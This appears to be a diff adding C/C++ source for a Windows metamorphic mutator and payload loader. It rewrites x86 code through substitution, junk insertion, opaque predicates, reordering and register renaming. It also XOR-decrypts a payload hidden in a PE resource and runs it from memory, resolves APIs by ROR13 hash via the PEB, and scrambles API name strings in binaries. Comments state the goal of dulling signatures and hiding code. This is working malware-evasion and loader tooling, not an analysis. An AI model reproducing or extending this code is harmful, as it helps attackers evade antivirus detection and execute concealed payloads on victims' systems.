@@ -1,0 +1,798 @@
+#include "mutator.h"
+
+#include <capstone/capstone.h>
+#include <keystone/keystone.h>
+#include <stdbool.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <windows.h>
+#include <winternl.h>
+
+#include <cstddef>
+#include <cstdint>
+#include <cstdlib>
+#include <cstring>
+#include <ctime>
+#include <regex>
+#include <string>
+#include <vector>
+
+#include "cJSON.h"
+
+// --- Configuration ---
+#define MAX_BLOCKS 128
+#define MAX_RECORDS 2048
+
+typedef struct {
+  int start_idx;
+  int end_idx;
+  size_t byte_size;
+} BasicBlock;
+
+// Simple XOR to "dull" the signature of the payload
+void xor_payload(unsigned char* data, size_t len, unsigned char key) {
+  for (size_t i = 0; i < len; i++) data[i] ^= key;
+}
+
+// Extraction Logic for the Stub/Loader
+void run_hidden_payload(int res_id) {
+  HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(res_id), RT_RCDATA);
+  if (!hRes) return;
+
+  DWORD size = SizeofResource(NULL, hRes);
+  HGLOBAL hData = LoadResource(NULL, hRes);
+  void* pData = LockResource(hData);
+
+  unsigned char* decrypted = (unsigned char*)malloc(size);
+  memcpy(decrypted, pData, size);
+  xor_payload(decrypted, size, 0x55);  // Use the same key as the builder
+
+  typedef LPVOID(WINAPI * PVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+  HMODULE k32 = get_kernel32_base();
+  PVirtualAlloc _VirtualAlloc =
+      (PVirtualAlloc)resolve_api_stilly(k32, ror13_hash("VirtualAlloc"));
+
+  void* exec_mem =
+      _VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  if (exec_mem) {
+    memcpy(exec_mem, decrypted, size);
+    DWORD old;
+    VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old);
+    ((void (*)())exec_mem)();
+  }
+  free(decrypted);
+}
+
+// Builder logic to hide code in resources
+bool embed_payload_in_resource(const char* target_exe,
+                               const unsigned char* payload, size_t size,
+                               int resource_id) {
+  HANDLE hUpdate = BeginUpdateResourceA(target_exe, FALSE);
+  if (hUpdate == NULL) return false;
+
+  if (!UpdateResourceA(hUpdate, RT_RCDATA, MAKEINTRESOURCEA(resource_id),
+                       MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
+                       (LPVOID)payload, (DWORD)size)) {
+    EndUpdateResource(hUpdate, TRUE);
+    return false;
+  }
+  return EndUpdateResource(hUpdate, FALSE);
+}
+
+// --- Utility: Convert Bytes to Hex String ---
+char* bytes_to_hex(unsigned char* data, size_t len) {
+  char* hex = (char*)malloc(len * 2 + 1);
+  if (!hex) return NULL;
+  for (size_t i = 0; i < len; i++) sprintf(hex + (i * 2), "%02x", data[i]);
+  hex[len * 2] = '\0';
+  return hex;
+}
+
+// --- Utility: Convert Hex String to Bytes ---
+unsigned char* hex_to_bytes(const char* hex, size_t* out_len) {
+  size_t len = strlen(hex);
+  if (len % 2 != 0) return NULL;
+  size_t final_len = len / 2;
+  unsigned char* bytes = (unsigned char*)malloc(final_len);
+  for (size_t i = 0; i < final_len; i++) {
+    sscanf(hex + 2 * i, "%02hhx", &bytes[i]);
+  }
+  *out_len = final_len;
+  return bytes;
+}
+
+// --- Helper: Dynamic Assembly with Address Support ---
+char* assemble_to_hex(Mutator* m, const char* asm_str, uint64_t addr,
+                      size_t* out_sz) {
+  unsigned char* encode;
+  size_t size, count;
+
+  if (ks_asm(m->ks, asm_str, addr, &encode, &size, &count) != KS_ERR_OK) {
+    if (m->debug)
+      fprintf(stderr, "[!] KS Error on '%s' at 0x%llx: %s\n", asm_str, addr,
+              ks_strerror(ks_errno(m->ks)));
+    return NULL;
+  }
+  char* hex = bytes_to_hex(encode, size);
+  if (out_sz) *out_sz = size;
+  ks_free(encode);
+  return hex;
+}
+
+char* expand_template(const std::string& tmpl, const std::smatch& matches) {
+  std::string result = tmpl;
+  for (size_t i = 1; i < matches.size(); ++i) {
+    std::string placeholder = "%" + std::to_string(i);
+    size_t pos = result.find(placeholder);
+    if (pos != std::string::npos && matches[i].matched) {
+      std::string replacement = matches[i].str();
+      result.replace(pos, placeholder.length(), replacement);
+    }
+  }
+  return _strdup(result.c_str());
+}
+
+// --- Technique 1: Instruction Substitution ---
+void apply_substitution(Mutator* m, cJSON* op, cJSON* reps) {
+  const char* original_asm = cJSON_GetObjectItem(op, "opcode")->valuestring;
+  const char* original_hex = cJSON_GetObjectItem(op, "bytes")->valuestring;
+  uint64_t offset = (uint64_t)cJSON_GetObjectItem(op, "offset")->valuedouble;
+
+  struct MatchResult {
+    MutationRule* rule;
+    std::smatch matches;
+  };
+  std::vector<MatchResult> candidates;
+
+  for (int i = 0; i < RULE_COUNT; i++) {
+    if (substitution_table[i].arch != m->bits) continue;
+    try {
+      std::regex pattern(substitution_table[i].regex_pattern,
+                         std::regex_constants::icase);
+      std::smatch match_info;
+      std::string target(original_asm);
+      if (std::regex_search(target, match_info, pattern)) {
+        candidates.push_back({&substitution_table[i], match_info});
+      }
+    } catch (...) {
+      continue;
+    }
+  }
+
+  if (candidates.empty()) return;
+
+  int choice = rand() % candidates.size();
+  char* expanded_asm = expand_template(candidates[choice].rule->tmpl,
+                                       candidates[choice].matches);
+
+  size_t new_sz;
+  char* new_hex = assemble_to_hex(m, expanded_asm, offset, &new_sz);
+  size_t old_sz = strlen(original_hex) / 2;
+
+  if (new_hex) {
+    cJSON* r = cJSON_CreateObject();
+    cJSON_AddNumberToObject(r, "offset", (double)offset);
+    cJSON_AddStringToObject(r, "newbytes", new_hex);
+    cJSON_AddItemToArray(reps, r);
+
+    if (new_sz != old_sz && m->record_count < MAX_RECORDS) {
+      m->records[m->record_count++] = {offset, (int)new_sz - (int)old_sz};
+    }
+    free(new_hex);
+  }
+  free(expanded_asm);
+}
+
+// --- Technique 2: Dead Code Insertion ---
+void apply_dead_code(Mutator* m, cJSON* op, cJSON* reps) {
+  if (rand() % 100 > 30) return;
+
+  const char* dead_32[] = {"nop", "xchg eax, eax", "mov eax, eax",
+                           "lea eax, [eax]"};
+  const char* dead_64[] = {"nop", "xchg rax, rax", "mov rax, rax",
+                           "lea rax, [rax]"};
+
+  const char** patterns = (m->bits == 64) ? dead_64 : dead_32;
+  const char* chosen = patterns[rand() % 4];
+
+  size_t sz;
+  uint64_t offset = (uint64_t)cJSON_GetObjectItem(op, "offset")->valuedouble;
+
+  char* dead_hex = assemble_to_hex(m, chosen, offset, &sz);
+  if (dead_hex) {
+    char combined[512];
+    sprintf(combined, "%s%s", dead_hex,
+            cJSON_GetObjectItem(op, "bytes")->valuestring);
+
+    cJSON* r = cJSON_CreateObject();
+    cJSON_AddNumberToObject(r, "offset", (double)offset);
+    cJSON_AddStringToObject(r, "newbytes", combined);
+    cJSON_AddItemToArray(reps, r);
+
+    if (m->record_count < MAX_RECORDS) {
+      m->records[m->record_count++] = {offset, (int)sz};
+    }
+    free(dead_hex);
+  }
+}
+
+// --- Technique 3: Junk Insertion ---
+void apply_junk_code(Mutator* m, cJSON* op, cJSON* reps) {
+  if (rand() % 100 > 20) return;
+
+  uint64_t offset = (uint64_t)cJSON_GetObjectItem(op, "offset")->valuedouble;
+
+  int junk_size = (rand() % 3) + 1;
+  char junk_hex[32] = {0};
+  for (int i = 0; i < junk_size; i++) {
+    char tmp[4];
+    sprintf(tmp, "%02x", rand() % 255);
+    strcat(junk_hex, tmp);
+  }
+
+  char jump_asm[64];
+  sprintf(jump_asm, "jmp %d", junk_size);
+
+  size_t jump_sz;
+  char* jump_hex = assemble_to_hex(m, jump_asm, offset, &jump_sz);
+  if (!jump_hex) return;
+
+  char combined[1024];
+  sprintf(combined, "%s%s%s", jump_hex, junk_hex,
+          cJSON_GetObjectItem(op, "bytes")->valuestring);
+
+  cJSON* r = cJSON_CreateObject();
+  cJSON_AddNumberToObject(r, "offset", (double)offset);
+  cJSON_AddStringToObject(r, "newbytes", combined);
+  cJSON_AddItemToArray(reps, r);
+
+  if (m->record_count < MAX_RECORDS) {
+    m->records[m->record_count++] = {offset, (int)jump_sz + junk_size};
+  }
+  free(jump_hex);
+}
+
+// --- Technique 4: Control Flow Obfuscation ---
+void apply_control_flow(Mutator* m, cJSON* op, cJSON* reps) {
+  if (rand() % 100 > 15) return;
+
+  uint64_t offset = (uint64_t)cJSON_GetObjectItem(op, "offset")->valuedouble;
+  const char* opaque = "clc; jnc 1";
+
+  size_t sz;
+  char* hex = assemble_to_hex(m, opaque, offset, &sz);
+  if (!hex) return;
+
+  int junk_byte = rand() % 0xFF;
+  char combined[2048];
+  sprintf(combined, "%s%02x%s", hex, junk_byte,
+          cJSON_GetObjectItem(op, "bytes")->valuestring);
+
+  cJSON* r = cJSON_CreateObject();
+  cJSON_AddNumberToObject(r, "offset", (double)offset);
+  cJSON_AddStringToObject(r, "newbytes", combined);
+  cJSON_AddItemToArray(reps, r);
+
+  if (m->record_count < MAX_RECORDS) {
+    m->records[m->record_count++] = {offset, (int)sz + 1};
+  }
+  free(hex);
+}
+
+// --- Technique 5: Instruction Reordering ---
+void apply_reordering(Mutator* m, cJSON* ops, cJSON* reps, csh handle) {
+  int count = cJSON_GetArraySize(ops);
+  if (count < 2) return;
+
+  for (int i = 0; i < count - 1; i++) {
+    if (rand() % 100 > 40) continue;
+
+    cJSON* opA = cJSON_GetArrayItem(ops, i);
+    cJSON* opB = cJSON_GetArrayItem(ops, i + 1);
+
+    const char* typeA = cJSON_GetObjectItem(opA, "type")->valuestring;
+    const char* typeB = cJSON_GetObjectItem(opB, "type")->valuestring;
+
+    if (strstr(typeA, "jump") || strstr(typeA, "call") || strstr(typeA, "ret"))
+      continue;
+    if (strstr(typeB, "jump") || strstr(typeB, "call") || strstr(typeB, "ret"))
+      continue;
+
+    const char* bytesA_str = cJSON_GetObjectItem(opA, "bytes")->valuestring;
+    const char* bytesB_str = cJSON_GetObjectItem(opB, "bytes")->valuestring;
+
+    if (strlen(bytesA_str) != strlen(bytesB_str)) continue;
+
+    cs_insn* insn;
+    size_t code_len_A, code_len_B;
+    unsigned char* code_A = hex_to_bytes(bytesA_str, &code_len_A);
+    unsigned char* code_B = hex_to_bytes(bytesB_str, &code_len_B);
+
+    uint64_t addrA = (uint64_t)cJSON_GetObjectItem(opA, "offset")->valuedouble;
+    uint64_t addrB = (uint64_t)cJSON_GetObjectItem(opB, "offset")->valuedouble;
+
+    size_t countA = cs_disasm(handle, code_A, code_len_A, addrA, 1, &insn);
+    if (countA != 1) {
+      free(code_A);
+      free(code_B);
+      continue;
+    }
+    cs_detail* dA = insn[0].detail;
+
+    uint16_t readA[20], writeA[20];
+    uint8_t rA_count = dA->regs_read_count;
+    uint8_t wA_count = dA->regs_write_count;
+    memcpy(readA, dA->regs_read, rA_count * sizeof(uint16_t));
+    memcpy(writeA, dA->regs_write, wA_count * sizeof(uint16_t));
+    cs_free(insn, countA);
+
+    size_t countB = cs_disasm(handle, code_B, code_len_B, addrB, 1, &insn);
+    if (countB != 1) {
+      free(code_A);
+      free(code_B);
+      continue;
+    }
+    cs_detail* dB = insn[0].detail;
+
+    bool safe = true;
+    for (int x = 0; x < wA_count; x++) {
+      for (int y = 0; y < dB->regs_read_count; y++)
+        if (writeA[x] == dB->regs_read[y]) safe = false;
+      for (int y = 0; y < dB->regs_write_count; y++)
+        if (writeA[x] == dB->regs_write[y]) safe = false;
+    }
+    for (int x = 0; x < rA_count; x++) {
+      for (int y = 0; y < dB->regs_write_count; y++)
+        if (readA[x] == dB->regs_write[y]) safe = false;
+    }
+
+    cs_free(insn, countB);
+    free(code_A);
+    free(code_B);
+
+    if (safe) {
+      cJSON* r1 = cJSON_CreateObject();
+      cJSON_AddNumberToObject(r1, "offset", (double)addrA);
+      cJSON_AddStringToObject(r1, "newbytes", bytesB_str);
+      cJSON_AddItemToArray(reps, r1);
+
+      cJSON* r2 = cJSON_CreateObject();
+      cJSON_AddNumberToObject(r2, "offset", (double)addrB);
+      cJSON_AddStringToObject(r2, "newbytes", bytesA_str);
+      cJSON_AddItemToArray(reps, r2);
+
+      i++;
+    }
+  }
+}
+
+// --- Technique 6: Basic Block Permutation ---
+void apply_structural_mutation(Mutator* m, cJSON* ops, cJSON* reps) {
+  BasicBlock blocks[MAX_BLOCKS];
+  int block_count = 0, start = 0;
+  int n = cJSON_GetArraySize(ops);
+
+  for (int i = 0; i < n; i++) {
+    cJSON* op = cJSON_GetArrayItem(ops, i);
+    const char* type = cJSON_GetObjectItem(op, "type")->valuestring;
+    if (strstr(type, "jump") || strstr(type, "ret") || i == n - 1) {
+      blocks[block_count++] = {start, i, 0};
+      start = i + 1;
+      if (block_count >= MAX_BLOCKS) break;
+    }
+  }
+
+  for (int i = 0; i < block_count - 1; i++) {
+    size_t s1 = 0, s2 = 0;
+
+    for (int j = blocks[i].start_idx; j <= blocks[i].end_idx; j++)
+      s1 += strlen(cJSON_GetObjectItem(cJSON_GetArrayItem(ops, j), "bytes")
+                       ->valuestring) /
+            2;
+
+    for (int j = blocks[i + 1].start_idx; j <= blocks[i + 1].end_idx; j++)
+      s2 += strlen(cJSON_GetObjectItem(cJSON_GetArrayItem(ops, j), "bytes")
+                       ->valuestring) /
+            2;
+
+    if (s1 == s2 && s1 > 0 && rand() % 2 == 0) {
+      for (int j = 0; j <= (blocks[i].end_idx - blocks[i].start_idx); j++) {
+        cJSON* opA = cJSON_GetArrayItem(ops, blocks[i].start_idx + j);
+        cJSON* opB = cJSON_GetArrayItem(ops, blocks[i + 1].start_idx + j);
+
+        cJSON* r1 = cJSON_CreateObject();
+        cJSON_AddNumberToObject(
+            r1, "offset", cJSON_GetObjectItem(opA, "offset")->valuedouble);
+        cJSON_AddStringToObject(r1, "newbytes",
+                                cJSON_GetObjectItem(opB, "bytes")->valuestring);
+        cJSON_AddItemToArray(reps, r1);
+
+        cJSON* r2 = cJSON_CreateObject();
+        cJSON_AddNumberToObject(
+            r2, "offset", cJSON_GetObjectItem(opB, "offset")->valuedouble);
+        cJSON_AddStringToObject(r2, "newbytes",
+                                cJSON_GetObjectItem(opA, "bytes")->valuestring);
+        cJSON_AddItemToArray(reps, r2);
+      }
+      i++;
+    }
+  }
+}
+
+// --- Technique 7: Register Renaming ---
+
+typedef struct {
+  const char* r64;
+  const char* r32;
+  const char* r16;
+  const char* r8;
+} RegGroup;
+
+RegGroup x64_regs[] = {
+    {"rax", "eax", "ax", "al"},  {"rbx", "ebx", "bx", "bl"},
+    {"rcx", "ecx", "cx", "cl"},  {"rdx", "edx", "dx", "dl"},
+    {"rsi", "esi", "si", "sil"}, {"rdi", "edi", "di", "dil"}};
+
+void apply_register_renaming(Mutator* m, cJSON* ops, cJSON* reps) {
+  if (rand() % 100 > 50) return;
+
+  int idx1 = rand() % 6;
+  int idx2 = rand() % 6;
+  while (idx1 == idx2) idx2 = rand() % 6;
+
+  RegGroup g1 = x64_regs[idx1];
+  RegGroup g2 = x64_regs[idx2];
+
+  int count = cJSON_GetArraySize(ops);
+  for (int i = 0; i < count; i++) {
+    cJSON* op = cJSON_GetArrayItem(ops, i);
+    const char* original_asm = cJSON_GetObjectItem(op, "opcode")->valuestring;
+    uint64_t offset = (uint64_t)cJSON_GetObjectItem(op, "offset")->valuedouble;
+
+    std::string asm_str(original_asm);
+    bool modified = false;
+
+    const char* targets1[] = {g1.r64, g1.r32, g1.r16, g1.r8};
+    const char* targets2[] = {g2.r64, g2.r32, g2.r16, g2.r8};
+
+    for (int j = 0; j < 4; j++) {
+      std::string p1 = "\\b" + std::string(targets1[j]) + "\\b";
+      std::string p2 = "\\b" + std::string(targets2[j]) + "\\b";
+      std::string placeholder = "___REG_TMP___";
+
+      if (std::regex_search(asm_str,
+                            std::regex(p1, std::regex_constants::icase)) ||
+          std::regex_search(asm_str,
+                            std::regex(p2, std::regex_constants::icase))) {
+        asm_str = std::regex_replace(
+            asm_str, std::regex(p1, std::regex_constants::icase), placeholder);
+        asm_str = std::regex_replace(
+            asm_str, std::regex(p2, std::regex_constants::icase), targets1[j]);
+        asm_str =
+            std::regex_replace(asm_str, std::regex(placeholder), targets2[j]);
+        modified = true;
+      }
+    }
+
+    if (modified) {
+      size_t new_sz;
+      char* new_hex = assemble_to_hex(m, asm_str.c_str(), offset, &new_sz);
+      if (new_hex) {
+        cJSON* r = cJSON_CreateObject();
+        cJSON_AddNumberToObject(r, "offset", (double)offset);
+        cJSON_AddStringToObject(r, "newbytes", new_hex);
+        cJSON_AddItemToArray(reps, r);
+
+        size_t old_sz =
+            strlen(cJSON_GetObjectItem(op, "bytes")->valuestring) / 2;
+        if (new_sz != old_sz && m->record_count < MAX_RECORDS) {
+          m->records[m->record_count++] = {offset, (int)new_sz - (int)old_sz};
+        }
+        free(new_hex);
+      }
+    }
+  }
+}
+
+// --- Technique 8: Data/Constant Obfuscation ---
+void apply_data_obfuscation(Mutator* m, cJSON* op, cJSON* reps) {
+  if (rand() % 100 > 50) return;
+
+  const char* original_asm = cJSON_GetObjectItem(op, "opcode")->valuestring;
+  const char* original_hex = cJSON_GetObjectItem(op, "bytes")->valuestring;
+  uint64_t offset = (uint64_t)cJSON_GetObjectItem(op, "offset")->valuedouble;
+  std::string target(original_asm);
+
+  // 1. Splitting 64-bit constants (e.g., Float -> int[2])
+  std::regex re_64(
+      "(movabs|mov)\\s+([er][a-d]x|r[0-9]+)\\s*,\\s*(0x[0-9a-fA-F]{16})",
+      std::regex_constants::icase);
+  std::smatch m64;
+
+  if (std::regex_search(target, m64, re_64)) {
+    std::string reg = m64[2].str();
+    uint64_t val = std::stoull(m64[3].str(), nullptr, 16);
+    uint32_t low = (uint32_t)(val & 0xFFFFFFFF);
+    uint32_t high = (uint32_t)(val >> 32);
+
+    char buf[256];
+    // Reconstruct using two 32-bit loads and a shift
+    sprintf(buf, "mov %s, 0x%x; mov r11, 0x%x; shl r11, 32; or %s, r11",
+            reg.c_str(), low, high, reg.c_str());
+
+    size_t new_sz;
+    char* new_hex = assemble_to_hex(m, buf, offset, &new_sz);
+    if (new_hex) {
+      cJSON* r = cJSON_CreateObject();
+      cJSON_AddNumberToObject(r, "offset", (double)offset);
+      cJSON_AddStringToObject(r, "newbytes", new_hex);
+      cJSON_AddItemToArray(reps, r);
+
+      size_t old_sz = strlen(original_hex) / 2;
+      if (new_sz != old_sz && m->record_count < MAX_RECORDS) {
+        m->records[m->record_count++] = {offset, (int)new_sz - (int)old_sz};
+      }
+      free(new_hex);
+      return;
+    }
+  }
+
+  // 2. XOR-Encoding 32-bit constants
+  std::regex re_32(
+      "mov\\s+([er][a-d]x|[er][sd]i|[er][sb]p)\\s*,\\s*(0x[0-9a-fA-F]{1,8})",
+      std::regex_constants::icase);
+  std::smatch m32;
+  if (std::regex_search(target, m32, re_32)) {
+    std::string reg = m32[1].str();
+    uint32_t val = (uint32_t)std::stoul(m32[2].str(), nullptr, 16);
+    uint32_t key = (rand() % 0xFEFF) + 0x100;
+    uint32_t enc = val ^ key;
+
+    char buf[128];
+    sprintf(buf, "mov %s, 0x%x; xor %s, 0x%x", reg.c_str(), enc, reg.c_str(),
+            key);
+
+    size_t new_sz;
+    char* new_hex = assemble_to_hex(m, buf, offset, &new_sz);
+    if (new_hex) {
+      cJSON* r = cJSON_CreateObject();
+      cJSON_AddNumberToObject(r, "offset", (double)offset);
+      cJSON_AddStringToObject(r, "newbytes", new_hex);
+      cJSON_AddItemToArray(reps, r);
+
+      size_t old_sz = strlen(original_hex) / 2;
+      if (new_sz != old_sz && m->record_count < MAX_RECORDS) {
+        m->records[m->record_count++] = {offset, (int)new_sz - (int)old_sz};
+      }
+      free(new_hex);
+    }
+  }
+}
+
+// --- CORE: Relocation Patcher ---
+void patch_relocations(Mutator* m, cJSON* ops, cJSON* reps) {
+  int n = cJSON_GetArraySize(ops);
+  for (int i = 0; i < n; i++) {
+    cJSON* op = cJSON_GetArrayItem(ops, i);
+    const char* type = cJSON_GetObjectItem(op, "type")->valuestring;
+
+    if (strstr(type, "jump") || strstr(type, "call")) {
+      uint64_t current_addr =
+          (uint64_t)cJSON_GetObjectItem(op, "offset")->valuedouble;
+      cJSON* tgt = cJSON_GetObjectItem(op, "jump");
+      if (!tgt) tgt = cJSON_GetObjectItem(op, "target");
+      if (!tgt) continue;
+
+      uint64_t target_addr = (uint64_t)tgt->valuedouble;
+      if (target_addr == 0) continue;
+
+      int shift_curr = 0;
+      for (int r = 0; r < m->record_count; r++) {
+        if (m->records[r].addr < current_addr)
+          shift_curr += m->records[r].delta;
+      }
+      uint64_t new_curr = current_addr + shift_curr;
+
+      int shift_tgt = 0;
+      for (int r = 0; r < m->record_count; r++) {
+        if (m->records[r].addr < target_addr) shift_tgt += m->records[r].delta;
+      }
+      uint64_t new_target = target_addr + shift_tgt;
+
+      if (shift_curr != shift_tgt) {
+        char buf[128];
+        const char* mnemonic = cJSON_GetObjectItem(op, "mnemonic")->valuestring;
+        sprintf(buf, "%s 0x%llx", mnemonic ? mnemonic : "jmp", new_target);
+
+        size_t dummy;
+        char* new_hex = assemble_to_hex(m, buf, new_curr, &dummy);
+
+        if (new_hex) {
+          cJSON* r = cJSON_CreateObject();
+          cJSON_AddNumberToObject(r, "offset", (double)current_addr);
+          cJSON_AddStringToObject(r, "newbytes", new_hex);
+          cJSON_AddItemToArray(reps, r);
+          free(new_hex);
+        }
+      }
+    }
+  }
+}
+
+// --- Main Orchestrator ---
+cJSON* mut_generate_final(Mutator* m, cJSON* fcn_ctx) {
+  m->record_count = 0;
+  cJSON* reps = cJSON_CreateArray();
+  cJSON* ops = cJSON_GetObjectItem(fcn_ctx, "ops");
+  int count = cJSON_GetArraySize(ops);
+
+  csh cs_handle;
+  cs_mode cs_m = (m->bits == 64) ? CS_MODE_64 : CS_MODE_32;
+  bool cs_ready = (cs_open(CS_ARCH_X86, cs_m, &cs_handle) == CS_ERR_OK);
+  if (cs_ready) cs_option(cs_handle, CS_OPT_DETAIL, CS_OPT_ON);
+
+  // 1. Data Obfuscation (Applied first to target constants)
+  if (m->enabled[TECH_DATA_OBFUSCATION]) {
+    for (int i = 0; i < count; i++)
+      apply_data_obfuscation(m, cJSON_GetArrayItem(ops, i), reps);
+  }
+
+  // 2. Register Renaming
+  if (m->enabled[TECH_REGISTER_RENAMING]) {
+    apply_register_renaming(m, ops, reps);
+  }
+
+  // 3. Instruction Substitution
+  if (m->enabled[TECH_INSTRUCTION_SUBSTITUTION]) {
+    for (int i = 0; i < count; i++)
+      apply_substitution(m, cJSON_GetArrayItem(ops, i), reps);
+  }
+
+  // 4. Instruction Reordering
+  if (m->enabled[TECH_INSTRUCTION_REORDERING] && cs_ready) {
+    apply_reordering(m, ops, reps, cs_handle);
+  }
+
+  // 5. Insertions (Dead Code, Junk, Control Flow)
+  if (m->enabled[TECH_DEAD_CODE_INSERTION]) {
+    for (int i = 0; i < count; i++)
+      apply_dead_code(m, cJSON_GetArrayItem(ops, i), reps);
+  }
+
+  if (m->enabled[TECH_JUNK_INSERTION]) {
+    for (int i = 0; i < count; i++)
+      apply_junk_code(m, cJSON_GetArrayItem(ops, i), reps);
+  }
+
+  if (m->enabled[TECH_CONTROL_FLOW_OBFUSCATION]) {
+    for (int i = 0; i < count; i++)
+      apply_control_flow(m, cJSON_GetArrayItem(ops, i), reps);
+  }
+
+  // 6. Structural changes
+  if (m->enabled[TECH_CODE_BLOCK_PERMUTATION])
+    apply_structural_mutation(m, ops, reps);
+
+  patch_relocations(m, ops, reps);
+
+  if (cs_ready) cs_close(&cs_handle);
+  return reps;
+}
+
+// --- Init & Cleanup ---
+Mutator* mut_init(int bits, bool debug, bool* techs) {
+  Mutator* m = (Mutator*)calloc(1, sizeof(Mutator));
+  m->bits = bits;
+  m->debug = debug;
+  ks_mode mode = (bits == 64) ? KS_MODE_64 : KS_MODE_32;
+  if (ks_open(KS_ARCH_X86, mode, &m->ks) != KS_ERR_OK) {
+    free(m);
+    return NULL;
+  }
+  if (techs) memcpy(m->enabled, techs, sizeof(bool) * TECH_COUNT);
+  srand((unsigned int)time(NULL));
+  return m;
+}
+
+void mut_free(Mutator* m) {
+  if (m->ks) ks_close(m->ks);
+  free(m);
+}
+
+// --- API Hashing / IAT Patching ---
+DWORD hash_string(const char* str) {
+  DWORD hash = 5381;
+  int c;
+  while ((c = *str++)) hash = ((hash << 5) + hash) + c;
+  return hash;
+}
+
+FARPROC get_proc_address_by_hash(HMODULE hModule, DWORD targetHash) {
+  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+  PIMAGE_NT_HEADERS ntHeaders =
+      (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+  PIMAGE_EXPORT_DIRECTORY exportDir =
+      (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
+                                ntHeaders->OptionalHeader
+                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+                                    .VirtualAddress);
+  DWORD* names = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+  WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+  DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+    const char* name = (const char*)((BYTE*)hModule + names[i]);
+    if (hash_string(name) == targetHash) {
+      WORD ordinal = ordinals[i];
+      return (FARPROC)((BYTE*)hModule + functions[ordinal]);
+    }
+  }
+  return NULL;
+}
+
+DWORD ror13_hash(const char* str) {
+  DWORD hash = 0;
+  while (*str) {
+    hash = (hash >> 13) | (hash << (32 - 13));
+    hash += *str++;
+  }
+  return hash;
+}
+
+HMODULE get_kernel32_base() {
+#ifdef _M_X64
+  PPEB peb = (PPEB)__readgsqword(0x60);
+#else
+  PPEB peb = (PPEB)__readfsdword(0x30);
+#endif
+  PLIST_ENTRY moduleList = &peb->Ldr->InMemoryOrderModuleList;
+  PLIST_ENTRY firstEntry = moduleList->Flink;
+  PLDR_DATA_TABLE_ENTRY k32Entry = CONTAINING_RECORD(
+      firstEntry->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+  return (HMODULE)k32Entry->DllBase;
+}
+
+FARPROC resolve_api_stilly(HMODULE hModule, DWORD targetHash) {
+  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
+  PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
+  PIMAGE_EXPORT_DIRECTORY exports =
+      (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
+                                nt->OptionalHeader
+                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+                                    .VirtualAddress);
+  DWORD* names = (DWORD*)((BYTE*)hModule + exports->AddressOfNames);
+  WORD* ordinals = (WORD*)((BYTE*)hModule + exports->AddressOfNameOrdinals);
+  DWORD* functions = (DWORD*)((BYTE*)hModule + exports->AddressOfFunctions);
+  for (DWORD i = 0; i < exports->NumberOfNames; i++) {
+    const char* name = (const char*)((BYTE*)hModule + names[i]);
+    if (ror13_hash(name) == targetHash) {
+      return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
+    }
+  }
+  return NULL;
+}
+
+void patch_binary_iat(const char* file_path, const char* api_name) {
+  FILE* f = fopen(file_path, "rb+");
+  if (!f) return;
+  fseek(f, 0, SEEK_END);
+  long size = ftell(f);
+  fseek(f, 0, SEEK_SET);
+  unsigned char* buffer = (unsigned char*)malloc(size);
+  fread(buffer, 1, size, f);
+  for (long i = 0; i < size - (long)strlen(api_name); i++) {
+    if (memcmp(buffer + i, api_name, strlen(api_name)) == 0) {
+      for (size_t j = 0; j < strlen(api_name); j++) {
+        buffer[i + j] = (unsigned char)(rand() % 255);
+      }
+    }
+  }
+  fseek(f, 0, SEEK_SET);
+  fwrite(buffer, 1, size, f);
+  fclose(f);
+  free(buffer);
+}
